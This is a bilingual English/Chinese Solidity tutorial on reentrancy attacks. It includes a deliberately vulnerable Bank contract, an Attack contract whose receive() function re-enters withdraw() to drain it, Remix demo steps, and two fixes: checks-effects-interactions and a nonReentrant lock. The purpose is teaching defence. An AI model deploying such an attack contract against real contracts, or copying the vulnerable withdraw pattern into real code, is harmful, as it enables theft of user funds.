---
title: S01. reentrancy attack
tags:
  - solidity
  - security
  - fallback
  - modifier
---

# WTF Solidity contract security:  S01. reentrancy attacks

I recently started learning solidity again, consolidating some details, and wrote a “WTF Solidity Simplified Introduction” for beginners (programming experts can find other tutorials), updating 1-3 lectures every week.

Twitter：[@0xAA_Science](https://twitter.com/0xAA_Science)

community：[Discord](https://discord.gg/5akcruXrsk)｜[WeChat group](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[official website WTF Academy](https://wtf.academy)

All code and tutorials are open source on GitHub : [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

-----

In this lecture, we will introduce the most common type of smart contract attack - reentrancy attack, which once caused Ethereum to fork into ETH and ETC (Ethereum Classic), and explain how to avoid it.

##  reentrancy attacks 

 Reentrancy attack is the most common type of attack on smart contracts, where attackers exploit contract vulnerabilities (such as fallback functions) to repeatedly call contracts, transfer assets out of contracts or mint a large number of tokens.
 
some notable reentrancy attacks: 

-  In 2016, The DAO contract was attacked by reentrancy, hackers stole 3,600,000 ETH from the contract, and caused Ethereum to fork into `ETH `chain and `ETC` (Ethereum Classic) chain.
- In 2019, synthetic asset platform Synthetix suffered a reentrancy attack and was stolen 3,700,000 `sETH`.
- In 2020, lending platform Lendf.me suffered a reentrancy attack and was stolen $25,000,000.
- In 2021, lending platform CREAM FINANCE suffered a reentrancy attack and was stolen $18,800,000.
- In 2022, algorithmic stablecoin project Fei suffered a reentrancy attack and was stolen $80,000,000.

It has been six years since The DAO was attacked by reentrancy, but every year there are still a few projects that lose tens of millions of dollars due to reentrancy vulnerabilities, so understanding this vulnerability is very important.

## `0xAA` The story of robbing a bank

In order to help everyone understand better, here is a story about ‘Hacker 0xAA robbing a bank’ for everyone.

The tellers at the Ethereum bank are all robots (Robot), controlled by smart contracts. When a normal user (User) comes to the bank to withdraw money, its service process is:

1. Check the user’s `ETH` balance. If it is greater than `0`, proceed to the next step. 
2. Transfer the user’s `ETH` balance from the bank to the user and ask if the user has received it. 
3. Update the balance under the user’s name to `0`.

One day, hacker 0xAA came to the bank. This is his conversation with the robot teller:
- 0xAA: I want to withdraw money, `1 ETH`.
- Robot:Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`。
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- ...

In the end, `0xAA` exploited a vulnerability in the re-entry attack and emptied the bank’s assets. The bank died.

![](./img/S01-1.png)

## Example of a vulnerable contract

### Bank contract

The bank contract is very simple. It contains `1` state variable `balanceOf` that records the Ethereum balance of all users. It contains `3 `functions:
- `deposit()`：存款函数，将`ETH`存入银行合约，并更新用户的余额。
- `withdraw()`：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。**注意：这个函数有重入漏洞！**
- `getBalance()`：获取银行合约里的`ETH`余额。

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### 攻击合约

重入攻击的一个攻击点就是合约转账`ETH`的地方：转账`ETH`的目标地址如果是合约，会触发对方合约的`fallback`（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读[WTF Solidity极简教程第19讲：接收ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md)。`Bank`合约在`withdraw()`函数中存在`ETH`转账：

```
(bool success, ) = msg.sender.call{value: balance}("");
```

假如黑客在攻击合约中的`fallback()`或`receive()`函数中重新调用了`Bank`合约的`withdraw()`函数，就会造成`0xAA`抢银行故事中的循环调用，不断让`Bank`合约转账给攻击者，最终将合约的`ETH`提空。

```solidity
    receive() external payable {
        bank.withdraw();
    }
```

下面我们看下攻击合约，它的逻辑非常简单，就是通过`receive()`回退函数循环调用`Bank`合约的`withdraw()`函数。它有`1`个状态变量`bank`用于记录`Bank`合约地址。它包含`4`个函数：

- 构造函数: 初始化`Bank`合约地址。
- `receive()`: 回调函数，在接收`ETH`时被触发，并再次调用`Bank`合约的`withdraw()`函数，循环提款。
- `attack()`：攻击函数，先`Bank`合约的`deposit()`函数存款，然后调用`withdraw()`发起第一次提款，之后`Bank`合约的`withdraw()`函数和攻击合约的`receive()`函数会循环调用，将`Bank`合约的`ETH`提空。
- `getBalance()`：获取攻击合约里的`ETH`余额。

```solidity
contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## `Remix`演示

1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
2. 切换到攻击者钱包，部署`Attack`合约。
3. 调用`Atack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。

## 预防办法

目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

### 检查-影响-交互模式

检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：

```solidity 
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```

### 重入锁

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity极简教程第11讲：修饰器](https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md)。

```solidity
uint256 private _status; // 重入锁

// 重入锁
modifier nonReentrant() {
    // 在第一次调用 nonReentrant 时，_status 将是 0
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // 在此之后对 nonReentrant 的任何调用都将失败
    _status = 1;
    _;
    // 调用结束，将 _status 恢复为0
    _status = 0;
}
```

只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。

```solidity
// 用重入锁保护有漏洞的函数
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```

## 总结

这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`0xAA`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。
